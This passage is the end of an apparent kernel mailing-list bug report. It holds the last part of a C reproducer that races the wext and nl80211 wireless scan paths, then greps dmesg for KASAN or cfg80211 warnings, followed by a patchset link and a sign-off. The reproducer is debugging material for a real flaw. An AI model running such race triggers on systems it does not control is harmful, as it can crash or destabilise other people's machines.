+             close(fd);
+         }
+         if (i % 2000 == 1999)
+             printf("[%d] wext=%d nl=%d\n", i + 1, wext_ok, nl_ok);
+     }
+
+     stop = 1;
+     pthread_barrier_wait(&barrier_go);
+     pthread_join(nt, NULL);
+
+     printf("\nFinal: wext=%d nl=%d\n", wext_ok, nl_ok);
+     if (wext_ok > 0 && nl_ok > 0) {
+         printf("RACE HIT! Both scan paths succeeded.\n"
+                "Run: dmesg | grep -E 'WARNING|KASAN|cfg80211_scan'\n");
+         fflush(stdout);
+         sleep(3);
+         system("dmesg | grep -iE 'WARNING|KASAN|cfg80211_scan' | tail 
+-20");
+     }
+     close(nl_sock);
+     return 0;
+}
+```
+
+[1] 
+https://sashiko.dev/#/patchset/a1be7eea4da0da18f90589af252bb76a18a61978.1781984889.git.christophe.jaillet%40wanadoo.fr
+
+Thanks,
+Xiao
+
